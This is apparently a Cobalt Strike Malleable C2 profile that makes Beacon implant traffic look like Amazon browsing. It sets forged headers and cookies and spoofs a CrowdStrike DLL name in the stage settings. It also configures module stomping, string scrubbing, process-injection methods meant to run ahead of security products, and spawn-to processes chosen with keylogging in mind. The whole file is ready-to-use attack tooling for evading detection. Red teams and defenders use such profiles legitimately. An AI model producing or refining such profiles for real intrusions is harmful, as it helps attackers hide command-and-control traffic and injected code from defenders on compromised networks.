#
# Amazon browsing traffic profile
# 
# Modified @harmj0y's Amazon profile from https://github.com/rsmudge/Malleable-C2-Profiles
#

set sleeptime "8000";
set jitter    "17";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {

    set uri "/s/ref=nb_sb_noss_1/122-3223588-02007569/field-keywords=books";

    client {

        header "Accept" "*/*";
        header "Host" "www.amazon.com";

        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-24KU11BB22RZSAED3BPL|1419835412978";
            header "Cookie";
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "LLKUYEZKCBVEW5Z41PZT";
        header "x-amz-id-2" "a11yZ2xwMMMtdGRsa555bGV3YW85lkZuZW9ydG5rXcFdZ2tmZGl6aOLvJJKpogo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/N4215/avp/amzn.us.sr.aps";

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "www.amazon.com";

        parameter "sz" "180x680";
        parameter "oe" "oe=ISO-3312-2;";

        id {
            parameter "sn";
        }

        parameter "s" "3998";
        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

        output {
            base64;
            print;
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "LLKUYEZKCBVEW5Z41PZT";
        header "x-amz-id-2" "a11yZ2xwMMMtdGRsa555bGV3YW85lkZuZW9ydG5rXcFdZ2tmZGl6aOLvJJKpogo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            prepend "....----.....";
            append "--____---___---___";
            base64url;
            base64url;
            print;
        }
    }
}

http-stager {

    client {
        header "Host" "www.amazon.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
    }

    server {
        header "Cache-Control" "private, max-age=3600";
        header "Content-Type" "application/json; charset=UTF-8";
        header "Server" "aws";
        header "Connection" "close";
    }
}

stage {
    set checksum       "0";
    set compile_time   "25 Oct 2019 13:10:50";
    set entry_point    "8800";
    set name           "CSCOMUtils.dll";  #CrowdStrike DLL
    set rich_header    "\xbd\xa1\x57\x94\xf9\xc0\x39\xc7\xf9\xc0\x39\xc7\xf9\xc0\x39\xc7\x9c\xa6\x3a\xc6\xfc\xc0\x39\xc7\x9c\xa6\x3c\xc6\x7a\xc0\x39\xc7\xab\xa8\x3a\xc6\xf1\xc0\x39\xc7\xab\xa8\x3c\xc6\xd8\xc0\x39\xc7\xab\xa8\x3d\xc6\xf7\xc0\x39\xc7\x95\xa8\x30\xc6\xfc\xc0\x39\xc7\x9c\xa6\x3d\xc6\xf4\xc0\x39\xc7\x9c\xa6\x38\xc6\xf0\xc0\x39\xc7\xf9\xc0\x38\xc7\x97\xc0\x39\xc7\x95\xa8\x39\xc6\xf8\xc0\x39\xc7\x95\xa8\xc6\xc7\xf8\xc0\x39\xc7\x95\xa8\x3b\xc6\xf8\xc0\x39\xc7\x52\x69\x63\x68\xf9\xc0\x39\xc7\x00\x00\x00\x00\x00\x00\x00\x00";

    #set name "cylance.dll";
    set userwx "false";
    set obfuscate "true"; # set stomppe "true" to lightly obfuscate, set stomppe "false" for no obfuscation
    set cleanup "true"; # removes self-bootstrapping Reflective Loader for beacon via VirtualFree
    set sleep_mask "true";

    # adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
    set module_x64 "netshell.dll"; # 2,875,904 bytes
    set module_x86 "netshell.dll";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "ama";
        strrep "This program cannot be run in DOS mode" "";
        strrep "beacon.dll" "";
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        strrep "ReflectiveLoader" "ama";
        strrep "This program cannot be run in DOS mode" "";
        strrep "beacon.x64x.dll" "";
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
}

process-inject {
    # set remote memory allocation technique
    set allocator "NtMapViewOfSection"; # either VirtualAllocEx (default; cross-arch) or NtMapViewOfSection (same arch)
 
    # shape the content and properties of what we will inject
    set min_alloc "16384"; # minimum size of the block Beacon will allocate in a remote process
    set userwx    "false"; # avoid rwx memory pages
    set startrwx "false"; # avoid rwx memory pages
 
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
 
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
        append "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
 
    # specify how we execute code in the remote process
    execute {
        CreateThread "ntdll!RtlUserThreadStart"; # self-injection; spawns a suspended thread that points to the RtlUserThreadStart function
        CreateThread; # self-injection; spins up a thread pointing to the code you want Beacon to run
        SetThreadContext; # works on x86 -> x86, x64 -> x64, and x64 -> x86; thread will have a start address that reflects the original execution entry point of the temporary process
        NtQueueApcThread-s; # only x86 -> x86 and x64 -> x64; supposedly allows our injected capability to initialize itself in the process before some userland-resident security products initialize themselves
        NtQueueApcThread; # only x86 -> x86 and x64 -> x64; target an existing remote process; pushes an RWX stub containing code and injection-related context to the remote process
        CreateRemoteThread;
        RtlCreateUserThread; #  inject code across session boundaries; fires Sysmon event 8
    }
}

post-ex {
    # Larger Cobalt Strike post-exploitation features (e.g.screenshot, keylogger, hashdump, mimikatz, portscan) are implemented as Windows DLLs. 

    # control the temporary process we spawn to; for keylogger <- find exec that works with user input and ideally that connects to internet in syswow64, sysnative dir
    #set spawnto_x86 "%windir%\\syswow64\\gpresult.exe"; 
    #set spawnto_x64 "%windir%\\sysnative\\gpresult.exe";

    #set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
    #set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";

    set spawnto_x86 "%windir%\\syswow64\\FlashPlayerApp.exe";
    set spawnto_x64 "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";

    #set spawnto_x86 "C:\\Program Files (x86)\\Microsoft Office\\Office16\\excelcnv.exe";
    #set spawnto_x64 "C:\\Program Files\\Mozilla Firefox\\firefox.exe";

    # scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way.
    set obfuscate "true";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "false"; # crashes temporary post-ex processes for latest win 10 
}
